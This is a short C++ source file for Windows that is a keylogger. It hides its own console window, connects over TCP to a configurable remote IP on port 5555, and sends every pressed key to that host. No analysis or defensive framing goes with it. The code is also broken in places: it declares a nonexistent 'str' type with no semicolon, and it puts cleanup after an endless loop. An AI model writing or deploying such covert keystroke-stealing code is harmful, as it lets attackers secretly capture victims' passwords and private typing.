
// We use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs.
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h> // includes networking utilities
#include <stdio.h> //includes standard input/output utilities (needed for perror())
#include <stdlib.h>
#include <Windows.h>

//Call and auto feed?
str targetIP = ""

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY; //hold a single key, for which we would check the status (if it's pressed or not).

    WSADATA WSAData; //This data type (it's a struct) holds information about windows socket implementation.
    SOCKET server; //This data type stores the connection of the SOCKET type.
    SOCKADDR_IN addr; //This data type (it's a struct) holds the details of socket connection.

    WSAStartup(MAKEWORD(2, 0), &WSAData); //Initialize usage of the winsock library (needed for opening a network connection).
    server = socket(AF_INET, SOCK_STREAM, 0); //Set up a TCP socket. AF_INET = IPv4. SOCK_STREAM = TCP socket.

    addr.sin_addr.s_addr = inet_addr(targetIP);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); ////Connect using above variables
  //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate#return-value
    while (true) {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000) {
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }
    }

   closesocket(server);
    //Clean up the Winsock library components.
   WSACleanup();
}
